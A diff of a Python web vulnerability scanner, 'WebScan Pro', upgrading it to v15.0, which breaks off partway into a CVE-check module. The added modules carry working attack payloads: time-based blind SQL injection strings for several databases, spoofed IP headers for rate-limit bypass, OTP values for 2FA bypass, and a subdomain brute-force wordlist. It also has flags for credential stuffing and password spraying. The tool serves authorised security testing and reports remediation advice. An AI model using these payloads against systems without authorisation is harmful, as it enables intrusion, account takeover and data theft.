@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# WebScan Pro v12.0 — Professional Penetration Testing Scanner
+# WebScan Pro v15.0 — Professional Penetration Testing Scanner
 
 import sys, os, re, time, socket, ssl, json, datetime, argparse, hashlib, hmac, subprocess
 import urllib3, requests, threading
@@ -27,7 +27,7 @@ except ImportError:
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-VERSION    = "12.0"
+VERSION    = "15.0"
 TOOL_NAME  = "WebScan Pro"
 UA         = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 TIMEOUT    = 7
@@ -374,6 +374,21 @@ CAT_META = {
 "attack_chains":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-693","cvss":9.5,
         "wstg":"WSTG-ATHZ-01","asvs":"ASVS-4.1.1",
         "biz":"Multiple vulnerabilities chained together create a critical attack path allowing full system compromise, data breach, or complete account takeover with minimal attacker skill required."},
+    "deep_subdomain":{"owasp":"A01:2021","owasp_name":"Broken Access Control","cwe":"CWE-200","cvss":0.0,
+        "wstg":"WSTG-INFO-04","asvs":"ASVS-14.2.3",
+        "biz":"Each discovered subdomain may host outdated apps or services with weaker security controls."},
+    "rate_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-307","cvss":7.5,
+        "wstg":"WSTG-ATHN-03","asvs":"ASVS-2.2.1",
+        "biz":"Rate limit bypass allows unlimited brute-force attacks, account takeover, and API abuse at scale."},
+    "mfa_bypass":{"owasp":"A07:2021","owasp_name":"Identification and Authentication Failures","cwe":"CWE-287","cvss":9.1,
+        "wstg":"WSTG-ATHN-06","asvs":"ASVS-2.8.1",
+        "biz":"Bypassing MFA completely removes the second layer of authentication — attacker only needs a stolen password to take over any account."},
+    "blind_sqli":{"owasp":"A03:2021","owasp_name":"Injection","cwe":"CWE-89","cvss":9.8,
+        "wstg":"WSTG-INPV-05","asvs":"ASVS-5.3.4",
+        "biz":"Time-based blind SQL injection allows full database extraction without any visible error — attacker can read all data silently."},
+    "cve_exploit":{"owasp":"A06:2021","owasp_name":"Vulnerable and Outdated Components","cwe":"CWE-1035","cvss":9.8,
+        "wstg":"WSTG-CONF-01","asvs":"ASVS-14.2.1",
+        "biz":"Known CVEs with public exploits allow any attacker to compromise your system using automated tools — no advanced skill required."},
 }
 
 CAT_TITLES = {
@@ -472,6 +487,11 @@ CAT_TITLES = {
     "backup_files":    ("🗄️",  "Backup & Sensitive File Discovery"),
     "email_security":  ("📧",  "Email Security (SPF / DKIM / DMARC)"),
     "attack_chains":   ("⛓",   "Attack-Chain Correlation"),
+    "deep_subdomain":  ("🔍",  "Deep Subdomain Brute-Force"),
+    "rate_bypass":     ("⏱",   "Rate Limit Bypass"),
+    "mfa_bypass":      ("🔐",  "2FA/MFA Bypass"),
+    "blind_sqli":      ("⏳",  "Blind SQLi — Time-Based"),
+    "cve_exploit":     ("📋",  "CVE Exploit Check"),
 }
 
 # ─── Terminal UI ───────────────────────────────────────────────────
@@ -5072,6 +5092,14 @@ def build_report(target, out_dir="./reports", cvss_min=0.0):
         err(_tb3.format_exc()[-400:])
         expert_path = None
 
+    # Executive Summary Report (v13.0)
+    exec_path = base + "_executive.html"
+    try:
+        _build_executive_report(target, exec_path)
+    except Exception as _ex_err:
+        warn(f"Executive report error: {_ex_err}")
+        exec_path = None
+
     return hpath, jpath, expert_path
 
 def _build_html(target, hpath, cvss_min=0.0):
@@ -5360,6 +5388,49 @@ def parse_args():
                         "(requires ANTHROPIC_API_KEY, OPENAI_API_KEY, GOOGLE_API_KEY, GROQ_API_KEY, or OLLAMA_HOST)")
     p.add_argument("--llm-provider",  default=None,
                    help="Force specific LLM provider: anthropic|openai|google|groq|ollama (auto-detected by default)")
+    # v13.0 — Speed mode & new features
+    p.add_argument("--speed",         default="normal",
+                   choices=["fast","normal","stealth","thorough"],
+                   help="Scan speed mode: fast|normal|stealth|thorough (default: normal)")
+    p.add_argument("--no-deep-subs",  action="store_true",
+                   help="Skip Module 93 — Deep Subdomain Brute-Force")
+    p.add_argument("--no-blind-sqli", action="store_true",
+                   help="Skip Module 96 — Time-Based Blind SQLi")
+    p.add_argument("--alert",         action="store_true",
+                   help="Send Telegram/Slack alert for critical findings (requires TELEGRAM_BOT_TOKEN+TELEGRAM_CHAT_ID or SLACK_WEBHOOK_URL)")
+    # v14.0 — Authenticated scanning
+    p.add_argument("--login-url",   default="", metavar="URL",
+                   help="Login form URL for authenticated scanning (Module 99)")
+    p.add_argument("--login-user",  default="", metavar="USER",
+                   help="Username for authenticated scanning")
+    p.add_argument("--login-pass",  default="", metavar="PASS",
+                   help="Password for authenticated scanning")
+    # v14.0 — Professional features
+    p.add_argument("--webhook",     default="", metavar="URL",
+                   help="Webhook URL — POST JSON notification on scan complete")
+    p.add_argument("--no-nuclei",   action="store_true",
+                   help="Skip Nuclei scan (Module 98)")
+    p.add_argument("--no-services", action="store_true",
+                   help="Skip exposed services port scan (Modules 108-117)")
+    p.add_argument("--history",     action="store_true",
+                   help="Show past scan history from local SQLite database")
+    p.add_argument("--compliance",  action="store_true",
+                   help="Generate OWASP Top 10 + PCI-DSS compliance report HTML")
+    # v15.0 flags
+    p.add_argument("--passive",        action="store_true",
+                   help="Enable passive recon mode (Module 144: URLScan, Wayback, crt.sh)")
+    p.add_argument("--attack-graph",   action="store_true",
+                   help="Generate AI attack path graph after scan")
+    p.add_argument("--cred-stuff",     action="store_true",
+                   help="Run credential stuffing simulation")
+    p.add_argument("--spray",          action="store_true",
+                   help="Run password spraying simulation")
+    p.add_argument("--no-smuggling",   action="store_true",
+                   help="Skip HTTP Request Smuggling test (Module 125)")
+    p.add_argument("--no-websocket",   action="store_true",
+                   help="Skip WebSocket security test (Module 127)")
+    p.add_argument("--spray-user-list",default="",
+                   help="Path to username list for password spraying")
     return p.parse_args()
 
 # ═══ MODULE 92 — ATTACK-CHAIN CORRELATION ENGINE (v12.0) ══════════
@@ -5600,6 +5671,13 @@ def main():
     global VERBOSE, QUIET, CHECKPOINT_FILE, SCAN_SCOPE, RATE_DELAY, TIMEOUT, THREADS
 
     args = parse_args()
+
+    # ── Speed mode (v13.0) ─────────────────────────────────────────
+    _apply_speed_mode(getattr(args, "speed", "normal"))
+    # v14.0 — History mode
+    if getattr(args, "history", False):
+        show_scan_history()
+        sys.exit(0)
 
     # Version
     if args.version:
@@ -5921,6 +5999,19 @@ def main():
         _futs2e = [_p2e.submit(t) for t in _p2e_tasks]
         for _f in as_completed(_futs2e): _pass(_f)
 
+    # ── PHASE 9b: NEW MODULES v13.0 ────────────────────────────────
+    section("PHASE 9b — NEW MODULES (Deep Subs · Rate Bypass · 2FA · Blind SQLi · CVE)","🆕")
+    _p9b_tasks = [
+        lambda: _run(deep_subdomain_bruteforce, url) if not getattr(args,"no_deep_subs",False) else info("Deep Subdomain skipped (--no-deep-subs)"),
+        lambda: _run(api_rate_limit_bypass, url),
+        lambda: _run(mfa_bypass_scan, url),
+        lambda: _run(blind_sqli_scan, url) if not getattr(args,"no_blind_sqli",False) else info("Blind SQLi skipped (--no-blind-sqli)"),
+        lambda: _run(cve_exploit_check, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9b:
+        _futs9b = [_p9b.submit(t) for t in _p9b_tasks]
+        for _f in as_completed(_futs9b): _pass(_f)
+
     # ── PHASE 10: REPORTS ──────────────────────────────────────────
     section("PHASE 10 — REPORT GENERATION (HTML · JSON · PDF · Expert)","📊")
     # Auto-create output directory
@@ -5933,6 +6024,32 @@ def main():
         html_path = os.path.join(args.output, "report_error.html")
         json_path = os.path.join(args.output, "report_error.json")
         expert_path = None
+    # v14.0 — Compliance report
+    if getattr(args, "compliance", False):
+        try:
+            ts_comp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            comp_path = os.path.join(args.output, f"webscanpro_{ts_comp}_compliance.html")
+            _build_compliance_report(url, comp_path)
+        except Exception as _ce:
+            warn(f"Compliance report error: {_ce}")
+    # v14.0 — Scan history
+    try:
+        save_scan_history(url, report_path=html_path if html_path else "")
+    except Exception as _he:
+        warn(f"History save error: {_he}")
+    # v15.0 — Attack Path Graph
+    if getattr(args, "attack_graph", False):
+        try:
+            ts_ag = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+            ag_path = os.path.join(args.output, f"webscanpro_{ts_ag}_attack_graph.html")
+            _build_attack_path_graph(url, ag_path)
+            good(f"Attack Path Graph: {ag_path}")
+        except Exception as _age:
+            warn(f"Attack graph error: {_age}")
+    # v14.0 — Webhook notification
+    _webhook_url = getattr(args, "webhook", "") or os.environ.get("WEBSCAN_WEBHOOK","")
+    if _webhook_url:
+        send_webhook_notification(url, _webhook_url)
     # Burp Suite XML — only with --burp flag
     burp_path = None
     if args.burp:
@@ -5986,6 +6103,128 @@ def main():
     # Runs LAST — after all scans + LLM Triage so all findings are available
     section("PHASE 12 — ATTACK-CHAIN CORRELATION ENGINE","⛓")
     attack_chain_correlation(url)
+
+    # ── PHASE 13: ALERTS (Telegram / Slack) ────────────────────────
+    if getattr(args, "alert", False) or os.environ.get("TELEGRAM_BOT_TOKEN","") or os.environ.get("SLACK_WEBHOOK_URL",""):
+        send_critical_alerts(url)
+
+    # ── PHASE 9c: v14.0 MODULES ──────────────────────────────────
+    section("PHASE 9c — v14.0 MODULES (Nuclei · Auth · LDAP · XPath · RFI · Session · Git · ENV · SourceMap · SOAP · Services · CSP · NullByte · BizLogic · JSON · APIVer · Unicode · WinTraversal)","🆕")
+    if getattr(args,"login_url",""):
+        _run(authenticated_scan_login, url,
+             getattr(args,"login_url",""),
+             getattr(args,"login_user",""),
+             getattr(args,"login_pass",""))
+    if not getattr(args,"no_nuclei",False):
+        _run(nuclei_scan, url)
+    else:
+        info("Nuclei skipped (--no-nuclei)")
+    _p9c_tasks_a = [
+        lambda: _run(ldap_injection_scan, url),
+        lambda: _run(xpath_injection_scan, url),
+        lambda: _run(rfi_scan, url),
+        lambda: _run(session_fixation_scan, url),
+        lambda: _run(git_svn_exposure_deep, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9ca:
+        _futs9ca = [_p9ca.submit(t) for t in _p9c_tasks_a]
+        for _f in as_completed(_futs9ca): _pass(_f)
+    _p9c_tasks_b = [
+        lambda: _run(env_file_exposure, url),
+        lambda: _run(source_map_exposure, url),
+        lambda: _run(soap_wsdl_scan, url),
+        lambda: _run(csp_analysis_scan, url),
+        lambda: _run(null_byte_injection_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9cb:
+        _futs9cb = [_p9cb.submit(t) for t in _p9c_tasks_b]
+        for _f in as_completed(_futs9cb): _pass(_f)
+    _p9c_tasks_c = [
+        lambda: _run(business_logic_scan, url),
+        lambda: _run(json_injection_scan, url),
+        lambda: _run(api_version_attack, url),
+        lambda: _run(unicode_normalization_scan, url),
+        lambda: _run(windows_path_traversal_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9cc:
+        _futs9cc = [_p9cc.submit(t) for t in _p9c_tasks_c]
+        for _f in as_completed(_futs9cc): _pass(_f)
+    if not getattr(args,"no_services",False):
+        _run(exposed_services_scan, url)
+    else:
+        info("Exposed Services skipped (--no-services)")
+
+    # ─────────────────────────────────────────────────────────────────
+    # PHASE 9d — v15.0 MODULES (Smuggling · Cache · WS · Race · Mass
+    #            Assign · HPP · OAuth · JWT · SubTK · Email · Cloud ·
+    #            IMDS · CT · GraphQL · Deserial · SSTI · DOMClob ·
+    #            ReDoS · HTTP2 · PassiveRecon)
+    # ─────────────────────────────────────────────────────────────────
+    section("PHASE 9d — v15.0 MODULES (Advanced Security Intelligence)","🆕")
+
+    # Passive recon first (no active scanning of target)
+    if getattr(args, "passive", False):
+        _run(passive_recon_scan, url)
+    else:
+        _run(cert_transparency_recon, url)  # Always run CT recon (passive)
+
+    # HTTP smuggling (optional skip)
+    if not getattr(args, "no_smuggling", False):
+        _run(http_request_smuggling_scan, url)
+    else:
+        info("HTTP Smuggling skipped (--no-smuggling)")
+
+    # Batch A: Cache · WebSocket · Race · MassAssign · HPP
+    _p9d_tasks_a = [
+        lambda: _run(cache_poisoning_scan, url),
+        lambda: _run(race_condition_scan, url),
+        lambda: _run(mass_assignment_scan, url),
+        lambda: _run(http_parameter_pollution_scan, url),
+    ]
+    if not getattr(args, "no_websocket", False):
+        _p9d_tasks_a.append(lambda: _run(websocket_security_scan, url))
+    with ThreadPoolExecutor(max_workers=5) as _p9da:
+        _futs9da = [_p9da.submit(t) for t in _p9d_tasks_a]
+        for _f in as_completed(_futs9da): _pass(_f)
+
+    # Batch B: OAuth · JWT · SubTK · EmailInject · CloudStorage
+    _p9d_tasks_b = [
+        lambda: _run(oauth_oidc_scan, url),
+        lambda: _run(jwt_algorithm_confusion_scan, url),
+        lambda: _run(subdomain_takeover_scan, url),
+        lambda: _run(email_header_injection_scan, url),
+        lambda: _run(cloud_storage_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9db:
+        _futs9db = [_p9db.submit(t) for t in _p9d_tasks_b]
+        for _f in as_completed(_futs9db): _pass(_f)
+
+    # Batch C: IMDS·SSRF · GraphQL · Deserial · SSTI · DOM
+    _p9d_tasks_c = [
+        lambda: _run(aws_imds_ssrf_scan, url),
+        lambda: _run(graphql_deep_scan, url),
+        lambda: _run(deserialization_scan, url),
+        lambda: _run(advanced_ssti_scan, url),
+        lambda: _run(dom_clobbering_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=5) as _p9dc:
+        _futs9dc = [_p9dc.submit(t) for t in _p9d_tasks_c]
+        for _f in as_completed(_futs9dc): _pass(_f)
+
+    # Batch D: ReDoS · HTTP2
+    _p9d_tasks_d = [
+        lambda: _run(redos_scan, url),
+        lambda: _run(http2_attack_scan, url),
+    ]
+    with ThreadPoolExecutor(max_workers=2) as _p9dd:
+        _futs9dd = [_p9dd.submit(t) for t in _p9d_tasks_d]
+        for _f in as_completed(_futs9dd): _pass(_f)
+
+    # Credential Stuffing & Password Spraying (opt-in)
+    if getattr(args, "cred_stuff", False):
+        credential_stuffing_sim(url)
+    if getattr(args, "spray", False):
+        password_spray_sim(url)
 
     # ── SUMMARY ────────────────────────────────────────────────────
     counts = _sev_counts()
@@ -11600,3 +11839,5025 @@ def account_enum_scan(url):
 
 if __name__ == "__main__":
     main()
+
+
+# ═══════════════════════════════════════════════════════════════════
+# WebScan Pro v13.0 — NEW MODULES & FEATURES
+# ═══════════════════════════════════════════════════════════════════
+
+# ═══ MODULE 93 — DEEP SUBDOMAIN BRUTE-FORCE (v13.0) ════════════════
+def deep_subdomain_bruteforce(url):
+    """MODULE 93 — Deep subdomain brute-force with extended wordlist."""
+    if _module_skip("deep_subdomain"):
+        info("Skipping Deep Subdomain Brute-Force (already done)"); return
+    section("MODULE 93 — DEEP SUBDOMAIN BRUTE-FORCE","🔍")
+
+    parsed = _up(url)
+    domain = parsed.netloc or parsed.path
+    domain = re.sub(r'^www\.', '', domain.split(':')[0])
+
+    # Extended wordlist — common subdomains used in real environments
+    wordlist = [
+        "www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
+        "vpn","m","shop","ftp","mail2","test","portal","admin","host","api","dev",
+        "staging","beta","app","mobile","cdn","static","media","assets","img","images",
+        "video","download","files","docs","help","support","forum","wiki","news",
+        "login","auth","sso","oauth","id","accounts","user","users","profile",
+        "dashboard","panel","cp","cpanel","whm","plesk","webmin","phpmyadmin",
+        "db","database","mysql","postgres","redis","mongo","elastic","kafka",
+        "git","gitlab","github","jenkins","ci","cd","build","deploy","devops",
+        "k8s","kubernetes","docker","rancher","grafana","kibana","prometheus",
+        "monitor","metrics","logs","trace","alert","status","health","ping",
+        "api2","api3","v1","v2","v3","internal","private","intranet","local",
+        "corp","office","hr","finance","erp","crm","jira","confluence","slack",
+        "zoom","meet","calendar","email","smtp","imap","pop","mx","relay",
+        "backup","archive","old","legacy","new","next","prod","production","qa",
+        "uat","preprod","sandbox","demo","preview","review","stage","lab",
+        "research","analytics","data","report","reporting","bi","warehouse",
+        "storage","s3","bucket","blob","files2","upload","uploads","static2",
+        "fw","firewall","proxy","gateway","edge","lb","loadbalancer","haproxy",
+        "nginx","apache","iis","tomcat","jboss","wildfly","spring","node",
+        "pay","payment","checkout","cart","billing","invoice","subscription",
+        "partner","affiliate","client","customer","b2b","b2c","marketplace",
+    ]
+
+    found_subs = []
+    info(f"Deep Subdomain: testing {len(wordlist)} subdomains against {domain}...")
+
+    def _check_sub(sub):
+        fqdn = f"{sub}.{domain}"
+        try:
+            import dns.resolver as _dr
+            answers = _dr.resolve(fqdn, 'A', lifetime=3)
+            ips = [str(r) for r in answers]
+            return fqdn, ips
+        except Exception:
+            pass
+        # fallback: socket
+        try:
+            ip = socket.gethostbyname(fqdn)
+            return fqdn, [ip]
+        except Exception:
+            return None, []
+
+    with ThreadPoolExecutor(max_workers=30) as _ex:
+        futures = {_ex.submit(_check_sub, sub): sub for sub in wordlist}
+        for fut in as_completed(futures):
+            try:
+                fqdn, ips = fut.result()
+                if fqdn and ips:
+                    found_subs.append({"subdomain": fqdn, "ips": ips})
+                    good(f"  SUBDOMAIN: {fqdn} → {', '.join(ips)}")
+                    add("deep_subdomain", {
+                        "type": "Deep Subdomain Discovery",
+                        "severity": "Info",
+                        "subdomain": fqdn,
+                        "ips": ips,
+                        "url": f"http://{fqdn}",
+                        "detail": f"{fqdn} resolves to {', '.join(ips)}",
+                        "remediation": "Review all discovered subdomains and ensure unused ones are removed or secured.",
+                    })
+            except Exception:
+                pass
+
+    if found_subs:
+        good(f"Deep Subdomain: {len(found_subs)} subdomain(s) discovered")
+    else:
+        good("Deep Subdomain: No additional subdomains found")
+    _module_done("deep_subdomain")
+
+
+# ═══ MODULE 94 — API RATE LIMIT BYPASS (v13.0) ════════════════════
+def api_rate_limit_bypass(url):
+    """MODULE 94 — Test rate limit bypass via header manipulation."""
+    if _module_skip("rate_bypass"):
+        info("Skipping Rate Limit Bypass (already done)"); return
+    section("MODULE 94 — API RATE LIMIT BYPASS","⏱")
+
+    headers_to_test = [
+        {"X-Forwarded-For": "127.0.0.1"},
+        {"X-Real-IP": "127.0.0.1"},
+        {"X-Originating-IP": "127.0.0.1"},
+        {"X-Remote-IP": "127.0.0.1"},
+        {"X-Remote-Addr": "127.0.0.1"},
+        {"X-Client-IP": "127.0.0.1"},
+        {"X-Host": "127.0.0.1"},
+        {"Forwarded": "for=127.0.0.1"},
+        {"CF-Connecting-IP": "127.0.0.1"},
+        {"True-Client-IP": "127.0.0.1"},
+        {"X-Forwarded-For": "0.0.0.0"},
+        {"X-Forwarded-For": "localhost"},
+        {"X-Originating-IP": "::1"},
+        {"X-Custom-IP-Authorization": "127.0.0.1"},
+        {"X-ProxyUser-Ip": "127.0.0.1"},
+        {"X-Original-URL": "/"},
+        {"X-Rewrite-URL": "/"},
+        {"X-Override-URL": "/"},
+    ]
+
+    found = False
+    # Send baseline request
+    try:
+        base_r = SESSION.get(url, timeout=TIMEOUT, verify=False)
+        base_code = base_r.status_code
+        base_len  = len(base_r.content)
+    except Exception as _e:
+        warn(f"Rate Bypass: baseline request failed: {_e}"); _module_done("rate_bypass"); return
+
+    info(f"Rate Bypass: baseline → HTTP {base_code}, {base_len}B")
+    info(f"Rate Bypass: testing {len(headers_to_test)} bypass headers...")
+
+    for hdrs in headers_to_test:
+        try:
+            r = SESSION.get(url, headers=hdrs, timeout=TIMEOUT, verify=False)
+            hdr_name = list(hdrs.keys())[0]
+            # Detect bypass: 200 when baseline was blocked, or different response
+            if base_code in (429, 403, 503) and r.status_code == 200:
+                add("rate_bypass", {
+                    "type": "Rate Limit Bypass",
+                    "severity": "High",
+                    "header": hdr_name,
+                    "value": hdrs[hdr_name],
+                    "url": url,
+                    "detail": f"Header '{hdr_name}: {hdrs[hdr_name]}' bypassed rate limiting (HTTP {base_code}→{r.status_code})",
+                    "remediation": "Implement server-side rate limiting based on session/token, not IP. Validate and ignore untrusted proxy headers.",
+                })
+                vuln(f"Rate Limit Bypass via {hdr_name}: {hdrs[hdr_name]}", "High")
+                found = True
+            # Also flag if header causes unusual response
+            elif abs(len(r.content) - base_len) > 500 and r.status_code != base_code:
+                add("rate_bypass", {
+                    "type": "Rate Limit Bypass (Anomaly)",
+                    "severity": "Medium",
+                    "header": hdr_name,
+                    "value": hdrs[hdr_name],
+                    "url": url,
+                    "detail": f"Anomalous response with '{hdr_name}': HTTP {r.status_code}, {len(r.content)}B (baseline: {base_code}, {base_len}B)",
+                    "remediation": "Remove or validate all proxy/IP headers server-side.",
+                })
+                vuln(f"Rate Limit Anomaly via {hdr_name}", "Medium")
+                found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("Rate Limit Bypass: No bypass vectors found")
+    _module_done("rate_bypass")
+
+
+# ═══ MODULE 95 — 2FA / MFA BYPASS (v13.0) ════════════════════════
+def mfa_bypass_scan(url):
+    """MODULE 95 — Test 2FA/MFA bypass techniques."""
+    if _module_skip("mfa_bypass"):
+        info("Skipping 2FA/MFA Bypass (already done)"); return
+    section("MODULE 95 — 2FA / MFA BYPASS","🔐")
+
+    parsed = _up(url)
+    base   = f"{parsed.scheme}://{parsed.netloc}"
+    found  = False
+
+    # Common 2FA/OTP endpoints
+    otp_paths = [
+        "/2fa", "/mfa", "/otp", "/verify", "/verify-otp", "/verify-code",
+        "/auth/2fa", "/auth/mfa", "/auth/otp", "/auth/verify",
+        "/account/2fa", "/account/verify", "/login/2fa", "/login/verify",
+        "/api/2fa", "/api/mfa", "/api/otp", "/api/verify",
+        "/user/2fa", "/user/verify", "/security/2fa",
+    ]
+
+    # Bypass payloads
+    bypass_payloads = [
+        ("code", "000000"),
+        ("code", "111111"),
+        ("code", "123456"),
+        ("code", ""),
+        ("otp", "000000"),
+        ("otp", ""),
+        ("token", ""),
+        ("code", "null"),
+        ("code", "undefined"),
+        ("code[]", "123456"),    # array bypass
+        ("code", "0"),
+    ]
+
+    info(f"2FA Bypass: checking {len(otp_paths)} OTP endpoints...")
+
+    for path in otp_paths:
+        ep = base + path
+        try:
+            # First GET to check if endpoint exists
+            r = SESSION.get(ep, timeout=TIMEOUT, verify=False)
+            if r.status_code not in (200, 302, 405):
+                continue
+            info(f"  Found 2FA endpoint: {ep} [{r.status_code}]")
+
+            # Try bypass payloads
+            for param, val in bypass_payloads:
+                try:
+                    pr = SESSION.post(ep, data={param: val}, timeout=TIMEOUT,
+                                      verify=False, allow_redirects=True)
+                    # Signs of success: redirect to dashboard, token in response
+                    success_signals = ["dashboard", "home", "profile", "token",
+                                       "access_token", "success", "logged in",
+                                       "welcome", "account"]
+                    resp_text = pr.text.lower()
+                    if pr.status_code in (200, 302) and any(s in resp_text for s in success_signals):
+                        add("mfa_bypass", {
+                            "type": "2FA/MFA Bypass",
+                            "severity": "Critical",
+                            "url": ep,
+                            "payload": f"{param}={val}",
+                            "detail": f"Possible 2FA bypass at {ep} with {param}={repr(val)} → HTTP {pr.status_code}",
+                            "remediation": (
+                                "1. Never trust empty/null OTP values server-side\n"
+                                "2. Validate OTP server-side, not client-side\n"
+                                "3. Implement OTP expiry (30-60 seconds)\n"
+                                "4. Limit OTP attempts to 3-5 before lockout\n"
+                                "5. Invalidate OTP after single use"),
+                        })
+                        vuln(f"2FA Bypass at {ep} [{param}={repr(val)}]", "Critical")
+                        found = True
+                        break
+                except Exception:
+                    pass
+        except Exception:
+            pass
+
+    # Check for response manipulation bypass (OTP in response body)
+    info("2FA Bypass: checking if OTP is exposed in API response...")
+    for path in ["/api/send-otp", "/api/otp/send", "/api/auth/send-otp", "/auth/send-otp"]:
+        try:
+            r = SESSION.post(base + path, json={"email": "test@test.com"},
+                             timeout=TIMEOUT, verify=False)
+            if r.status_code == 200:
+                resp_j = r.json() if "json" in r.headers.get("content-type","") else {}
+                otp_keys = ["otp", "code", "token", "pin", "secret", "2fa_code"]
+                for k in otp_keys:
+                    if k in str(resp_j).lower():
+                        add("mfa_bypass", {
+                            "type": "OTP Exposed in API Response",
+                            "severity": "Critical",
+                            "url": base + path,
+                            "detail": f"OTP/code may be exposed in API response at {base+path}",
+                            "remediation": "Never return OTP/code in API response. Send only via SMS/email out-of-band.",
+                        })
+                        vuln(f"OTP possibly exposed in response at {base+path}", "Critical")
+                        found = True
+        except Exception:
+            pass
+
+    if not found:
+        good("2FA/MFA Bypass: No bypass vectors found")
+    _module_done("mfa_bypass")
+
+
+# ═══ MODULE 96 — BLIND SQLI TIME-BASED (v13.0) ════════════════════
+def blind_sqli_scan(url):
+    """MODULE 96 — Time-based blind SQL injection detection."""
+    if _module_skip("blind_sqli"):
+        info("Skipping Blind SQLi Time-Based (already done)"); return
+    section("MODULE 96 — BLIND SQLI (TIME-BASED)","⏳")
+
+    parsed = _up(url)
+    params = parse_qs(parsed.query)
+    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+    found  = False
+
+    # Time-based payloads for different DBs
+    time_payloads = [
+        # MySQL
+        ("MySQL",    "' AND SLEEP(5)-- -"),
+        ("MySQL",    "' OR SLEEP(5)-- -"),
+        ("MySQL",    "1' AND SLEEP(5)-- -"),
+        ("MySQL",    "\"; SELECT SLEEP(5)-- -"),
+        # PostgreSQL
+        ("PostgreSQL","'; SELECT pg_sleep(5)-- -"),
+        ("PostgreSQL","' OR pg_sleep(5)-- -"),
+        ("PostgreSQL","1; SELECT pg_sleep(5)-- -"),
+        # MSSQL
+        ("MSSQL",    "'; WAITFOR DELAY '0:0:5'-- -"),
+        ("MSSQL",    "1; WAITFOR DELAY '0:0:5'-- -"),
+        # Oracle
+        ("Oracle",   "' OR 1=1 AND ROWNUM=1 AND 1=(SELECT 1 FROM DUAL WHERE dbms_pipe.receive_message(('a'),5)=1)-- -"),
+        # SQLite
+        ("SQLite",   "' AND randomblob(500000000)-- -"),
+        # Generic
+        ("Generic",  "' OR '1'='1' AND SLEEP(5)-- -"),
+        ("Generic",  "0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z"),
+    ]
+
+    if not params:
+        info("Blind SQLi: No GET parameters found — testing common param names")
+        # Inject common param names
+        test_params = ["id", "user", "uid", "page", "cat", "item", "search", "q", "s"]
+        for pname in test_params:
+            for dbname, payload in time_payloads[:4]:
+                ep = f"{base}?{pname}=1{_ue(payload)}"
+                try:
+                    t0 = time.time()
+                    SESSION.get(ep, timeout=10, verify=False)
+                    elapsed_t = time.time() - t0
+                    if elapsed_t >= 4.5:
+                        add("blind_sqli", {
+                            "type": f"Blind SQLi — Time-Based ({dbname})",
+                            "severity": "Critical",
+                            "url": ep,
+                            "param": pname,
+                            "payload": payload,
+                            "delay": f"{elapsed_t:.2f}s",
+                            "db": dbname,
+                            "detail": f"Response delayed {elapsed_t:.2f}s with SLEEP payload on param '{pname}'",
+                            "remediation": "Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
+                        })
+                        vuln(f"Blind SQLi (Time-Based/{dbname}) param={pname} delay={elapsed_t:.2f}s", "Critical")
+                        found = True
+                        break
+                except requests.exceptions.Timeout:
+                    # Timeout = likely sleeping = vulnerable
+                    add("blind_sqli", {
+                        "type": f"Blind SQLi — Time-Based Timeout ({dbname})",
+                        "severity": "Critical",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "delay": ">7s (timeout)",
+                        "db": dbname,
+                        "detail": f"Request timed out with SLEEP payload on param '{pname}' — indicates time-based blind SQLi",
+                        "remediation": "Use parameterized queries / prepared statements. Never interpolate user input into SQL.",
+                    })
+                    vuln(f"Blind SQLi Timeout ({dbname}) param={pname}", "Critical")
+                    found = True
+                    break
+                except Exception:
+                    pass
+    else:
+        info(f"Blind SQLi: testing {len(params)} parameter(s)...")
+        for pname in list(params.keys())[:5]:
+            for dbname, payload in time_payloads:
+                test_params = dict(params)
+                test_params[pname] = payload
+                ep = base + "?" + "&".join(f"{k}={_ue(v[0])}" for k,v in test_params.items())
+                try:
+                    t0 = time.time()
+                    SESSION.get(ep, timeout=10, verify=False)
+                    elapsed_t = time.time() - t0
+                    if elapsed_t >= 4.5:
+                        add("blind_sqli", {
+                            "type": f"Blind SQLi — Time-Based ({dbname})",
+                            "severity": "Critical",
+                            "url": ep,
+                            "param": pname,
+                            "payload": payload,
+                            "delay": f"{elapsed_t:.2f}s",
+                            "db": dbname,
+                            "detail": f"Response delayed {elapsed_t:.2f}s with SLEEP payload on param '{pname}'",
+                            "remediation": "Use parameterized queries / prepared statements.",
+                        })
+                        vuln(f"Blind SQLi ({dbname}) param={pname} delay={elapsed_t:.2f}s", "Critical")
+                        found = True
+                        break
+                except requests.exceptions.Timeout:
+                    add("blind_sqli", {
+                        "type": f"Blind SQLi — Time-Based Timeout ({dbname})",
+                        "severity": "Critical",
+                        "url": ep,
+                        "param": pname,
+                        "payload": payload,
+                        "delay": ">7s",
+                        "db": dbname,
+                        "detail": f"Timeout with SLEEP payload on '{pname}'",
+                        "remediation": "Use parameterized queries / prepared statements.",
+                    })
+                    vuln(f"Blind SQLi Timeout ({dbname}) param={pname}", "Critical")
+                    found = True
+                    break
+                except Exception:
+                    pass
+
+    if not found:
+        good("Blind SQLi: No time-based injection detected")
+    _module_done("blind_sqli")
+
+
+# ═══ MODULE 97 — CVE EXPLOIT CHECK (v13.0) ════════════════════════
+def cve_exploit_check(url):
+    """MODULE 97 — Match detected technologies against known CVEs."""
+    if _module_skip("cve_exploit"):
+        info("Skipping CVE Exploit Check (already done)"); return
+    section("MODULE 97 — CVE EXPLOIT CHECK","📋")
+
+    # Pull from FINDINGS["tech"] if available
+    tech_findings = FINDINGS.get("tech", [])
